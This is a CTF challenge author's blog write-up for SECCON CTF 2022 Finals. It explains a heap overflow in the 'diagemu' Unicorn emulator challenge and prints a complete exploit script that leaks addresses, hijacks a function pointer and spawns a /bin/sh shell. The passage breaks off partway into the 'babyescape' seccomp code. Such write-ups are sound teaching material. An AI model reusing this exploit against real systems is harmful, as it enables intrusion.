---
title: Jeopardy Writeups - SECCON CTF 2022 Finals
url: https://ptr-yudai.hatenablog.com/entry/2023/02/14/033354
source: CTFするぞ
date: 2023-02-14
fetch_date: 2025-10-04T06:29:51.040548
---

# Jeopardy Writeups - SECCON CTF 2022 Finals

[![CTFするぞ](https://cdn.image.st-hatena.com/image/square/994ee0e012cf90178bff014bfd99123c02a89b36/backend=imagemagick;height=128;version=1;width=128/https%3A%2F%2Fcdn.user.blog.st-hatena.com%2Fblog_custom_icon%2F153103571%2F1535456424487441)](https://ptr-yudai.hatenablog.com/)

[CTFするぞ](https://ptr-yudai.hatenablog.com/)

[読者になる](https://blog.hatena.ne.jp/ptr-yudai/ptr-yudai.hatenablog.com/subscribe?utm_campaign=subscribe_blog&utm_medium=button&utm_source=blogs_topright_button)

# [CTFするぞ](https://ptr-yudai.hatenablog.com/)

## CTF以外のことも書くよ

[2023-02-14](https://ptr-yudai.hatenablog.com/archive/2023/02/14)

# [Jeopardy Writeups - SECCON CTF 2022 Finals](https://ptr-yudai.hatenablog.com/entry/2023/02/14/033354)

[SECCON](https://ptr-yudai.hatenablog.com/archive/category/SECCON)
[CTF](https://ptr-yudai.hatenablog.com/archive/category/CTF)
[Writeup](https://ptr-yudai.hatenablog.com/archive/category/Writeup)

I supported the organization of SECCON CTF 2022 Finals on February 11th and 12th in Asakusabashi, Tokyo.
This is the write-[ups](http://d.hatena.ne.jp/keyword/ups) for the Jeopardy challenges I created for this CTF.

* [[Pwnable] diagemu](#Pwnable-diagemu)
* [[Pwnable 250] babyescape](#Pwnable-250-babyescape)
* [[Pwnable 300] Dusty Storage](#Pwnable-300-Dusty-Storage)
* [[Pwnable 500] Conversation Starter](#Pwnable-500-Conversation-Starter)
* [[Reversing] Whisky](#Reversing-Whisky)
* [[Reversing] Paper House](#Reversing-Paper-House)
* [[Reversing] Check in Abyss](#Reversing-Check-in-Abyss)
* [Write-ups](#Write-ups)

I will write about the "King of the Hill" challenges later.

The challenge files are uploaded here[\*1](#f-4ef8ff52 "The official repository will be published by SECCON"):

[github.com](https://github.com/ptr-yudai/ptr-SECCON-CTF-2022-Finals)

Other write-[ups](http://d.hatena.ne.jp/keyword/ups) by other challenge authors:

[furutsuki.hatenablog.com](https://furutsuki.hatenablog.com/entry/2023/02/13/231456)

> [ To the players ]
> I'm looking forward to reading your write-[ups](http://d.hatena.ne.jp/keyword/ups)!
> Posting only solver scripts is fine if you're busy.
> Tag #SECCON or [ping](http://d.hatena.ne.jp/keyword/ping) @ptrYudai if you post it on [twitter](http://d.hatena.ne.jp/keyword/twitter) :)

| Category | Challenge | Estimated Difficulty (Domestic / International) | Score | Solves (Domestic / International) | Keywords |
| --- | --- | --- | --- | --- | --- |
| Pwnable | diagemu | Easy / Warmup | 200 | 2 / 8 | [Unicorn](http://d.hatena.ne.jp/keyword/Unicorn), Heap overflow |
| Pwnable | babyescape | Hard / Easy | 250 | 1 / 6 | [chroot](http://d.hatena.ne.jp/keyword/chroot), seccomp, Sandbox Escape |
| Pwnable | Dusty Storage | Lunatic / Medium | 300 | 0 / 7 | Heap, tcache |
| Pwnable | Conversation Starter | Impossible / Hard | 500 | 0 / 6 | Heap overflow, sbrk |
| Reversing | Whisky | Warmup / Warmup | 100 | 7 / 10 | Backdoor, uwsgi |
| Reversing | Paper House | Hard / Medium-hard | 250 | 3 / 7 | [Raspberry Pi](http://d.hatena.ne.jp/keyword/Raspberry%20Pi) Pico, Hardware |
| Reversing | Check in Abyss | Lunatic / Hard | 300 | 1 / 8 | SMI handler |

The score of the Jeopardy challenges are set to static points.
This is because it's hard to predict the final score of each challenge and balance them with the King of the Hill challenges.

# [Pwnable] diagemu

An [x86-64](http://d.hatena.ne.jp/keyword/x86-64) emulator written in C with the [Unicorn](https://www.unicorn-engine.org/) engine is given.
You can run arbitrary machine code in the emulator.
The following code shows the important feature of this emulator:

```
uint64_t last_insn_addr;
uint16_t last_insn_size;

/* Record last instruction fetched */
static void record_insn(uc_engine *uc, uint64_t address, uint16_t size,
                        void *_user_data) {
  last_insn_addr = address;
  last_insn_size = size;
}

/* Print crash dump */
void show_crash_dump(uint8_t *code) {
  uint32_t pos = v2ofs(last_insn_addr);
  printf("[FATAL] Segmentation fault\nCrash at 0x%lx (insn:", last_insn_addr);
  for (uint32_t i = 0; i < last_insn_size; i++)
    printf(" %02x", code[pos + i]);
  printf(")\n");
}
...
    // Emulate
    if (uc_emu_start(uc, ADDR_CODE_BASE, ADDR_CODE_BASE + SIZE_CODE, 0, 0)) {
      // Patch on crash
      show_crash_dump(code);
      reads("Patch: ", code + v2ofs(last_insn_addr), last_insn_size);
      continue;
    }
```

When your code crashes, the emulator enters diagnostic mode.
You can overwrite the instruction that caused the crash, and restart the code from the beginning.

There is no obvious bug in this program.
However, the [vulnerability](http://d.hatena.ne.jp/keyword/vulnerability) occurs due to a bad design of the [Unicorn](http://d.hatena.ne.jp/keyword/Unicorn) library.

The part of the code records the last instruction executed.

```
uint64_t last_insn_addr;
uint16_t last_insn_size;

/* Record last instruction fetched */
static void record_insn(uc_engine *uc, uint64_t address, uint16_t size,
                        void *_user_data) {
  last_insn_addr = address;
  last_insn_size = size;
}
```

This information is used in order to patch the instruction when it crashed the program.
`last_insn_size` holds the size of the last instruction.

What would happen when the crash is SIGILL?
How does [unicorn](http://d.hatena.ne.jp/keyword/unicorn) define the size of undefined instruction?

**The answer is 0xF1F1F1F1**.

[github.com](https://github.com/unicorn-engine/unicorn/blob/6c1cbef6ac505d355033aef1176b684d02e1eb3a/qemu/accel/tcg/translator.c#L155-L166)

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20230214/20230214010342.gif)

I don't understand why the programmer decided to use this magic number.
Anyway, a large heap buffer overflow occurs in diagemu due to this design.

There are many function pointers that the [Unicorn](http://d.hatena.ne.jp/keyword/Unicorn) engine uses.
My exploit overwrites one of them and writes a very simple call chain in order to set RDI to "[/bin/sh](http://d.hatena.ne.jp/keyword//bin/sh)" and call `system`.

```
from ptrlib import *
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "9001"))

code = nasm("""
xend    ; instruction not recognized by unicorn
db 0x41, 0x41, 0x41, 0x41, 0x42, 0x42, 0x42, 0x42
""", bits=64)

libc = ELF("./libc.so.6")
libunicorn = ELF("../files/diagemu/bin/libunicorn.so.2")
sock = Process("../files/diagemu/bin/diagemu",
               env={"LD_LIBRARY_PATH": "../distfiles/"})
#sock = Socket(HOST, PORT)

sock.sendafter(": ", str(len(code)))
sock.sendafter(": ", code)
sock.recvuntil("insn: ")
leak = b''
for i in range(0xf1f1):
    leak += bytes.fromhex(sock.recvregex("[0-9a-f]{2}").decode())
libunicorn_base = u64(leak[0xa8:0xb0]) - libunicorn.symbol('x86_reg_read_x86_64')
libunicorn.base = libunicorn_base
libc.base = libunicorn.base - 0x228000

do_system = libc.base + 0x508f0
rop_mov_rdi_praxP648h_call_praxP640h = libc.base + 0x00094b36
payload = leak[:0xb0] + p64(rop_mov_rdi_praxP648h_call_praxP640h) + leak[0xb8:]
payload = payload[:0x20+0x640] + p64(do_system+2) + p64(next(libc.find("/bin/sh"))) + payload[0x20+0x650:]
sock.sendafter("Patch: ", payload)

sock.sh()
```

I found this magic number when I was trying to make a [Unicorn](http://d.hatena.ne.jp/keyword/Unicorn) pwnable challenge that abuses `xbegin` instruction (and it turned out [Unicorn](http://d.hatena.ne.jp/keyword/Unicorn) doesn't support this feature).
That's why I'm using `xend` as an undefined instruction in my exploit XD

I heard a solution to overwrite RWX region of [Unicorn](http://d.hatena.ne.jp/keyword/Unicorn) instead of the call chain, which sounds interesting.

# [Pwnable 250] babyescape

The program is simple enough to paste here:

```
#include <linux/seccomp.h>
#include <sys/prctl.h>
#include <unistd.h>

static void install_seccomp() {
  static unsigned char filter[] = {
    32,0,0,0,4,0,0,0,21,0,0,12,62,0,0,192,32,0,0,0,0,0,0,0,53,0,10,0,0,0,0,
    64,21,0,9,0,161,...